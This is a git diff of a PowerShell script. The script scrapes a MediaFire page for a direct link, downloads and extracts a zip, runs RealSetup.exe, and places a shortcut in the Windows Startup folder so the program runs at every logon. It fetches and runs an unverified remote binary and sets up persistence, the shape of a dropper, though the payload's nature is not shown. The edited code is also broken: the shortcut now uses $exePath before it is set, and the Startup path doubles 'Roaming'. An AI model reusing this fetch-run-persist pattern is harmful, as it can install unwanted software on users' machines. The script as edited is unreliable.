@@ -1,18 +1,13 @@
-# ==============================
 # 1. Variables
-# ==============================
 
 $mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
-#$password = ""
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
-$tempPath  = $env:TEMP
+$tempPath  = $env:LocalAppData
 $zipPath  = Join-Path $tempPath $zipName
 $extractPath = Join-Path $tempPath "Real"
 
-# ==============================
 # 2. Prepare extraction directory
-# ==============================
 
 if (Test-Path $extractPath) {
     Remove-Item $extractPath -Recurse -Force
@@ -20,9 +15,7 @@ if (Test-Path $extractPath) {
 
 New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
 
-# ==============================
 # 3. Get MediaFire page
-# ==============================
 
 $headers = @{
     "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
@@ -43,9 +36,7 @@ catch {
     throw "Could not access MediaFire page: $($_.Exception.Message)"
 }
 
-# ==============================
 # 4. Find download URL
-# ==============================
 
 $directUrl = $null
 
@@ -81,9 +72,7 @@ Write-Host "Direct URL:"
 Write-Host $directUrl
 Write-Host ""
 
-# ==============================
 # 5. Download using curl.exe
-# ==============================
 
 if (Test-Path $zipPath) {
     Remove-Item $zipPath -Force
@@ -96,9 +85,9 @@ $curlArgs = @(
     "--location"
     "--fail"
     "--retry", "3"
-    "--retry-delay", "2"
+    "--retry-delay", "3"
     "--connect-timeout", "30"
-    "--max-time", "600"
+    "--max-time", "300"
     "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
     "-o", $zipPath
     $directUrl
@@ -110,9 +99,7 @@ if ($LASTEXITCODE -ne 0) {
     throw "curl download failed with exit code $LASTEXITCODE"
 }
 
-# ==============================
 # 6. Verify download
-# ==============================
 
 if (-not (Test-Path $zipPath)) {
     throw "Download failed: file was not created."
@@ -128,9 +115,7 @@ if ($file.Length -lt 1000) {
     throw "Downloaded file is suspiciously small."
 }
 
-# ==============================
 # 7. Extract
-# ==============================
 
 Write-Host "Extracting..."
 
@@ -140,9 +125,18 @@ if ($LASTEXITCODE -ne 0) {
     throw "tar extraction failed with exit code $LASTEXITCODE"
 }
 
-# ==============================
-# 8. Run EXE
-# ==============================
+# 8. Ink in Start Up
+
+$shortcutName = "Real.lnk"
+$startmenuPath = "$env:AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$shortcutFile = Join-Path $startmenuPath $shortcutName
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
+$Shortcut.TargetPath = $exePath
+$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
+$Shortcut.Save()
+
+# 9. Run EXE
 
 $exePath = Join-Path $extractPath $exeName
 
@@ -155,16 +149,3 @@ Write-Host "Starting $exePath"
 Start-Process `
     -FilePath $exePath `
     -Wait
-
-# ==============================
-# 8. Ink in Start Up
-# ==============================
-
-$shortcutName = "Real.lnk"
-$startmenuPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
-$shortcutFile = Join-Path $startmenuPath $shortcutName
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
-$Shortcut.TargetPath = $exePath
-$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
-$Shortcut.Save()
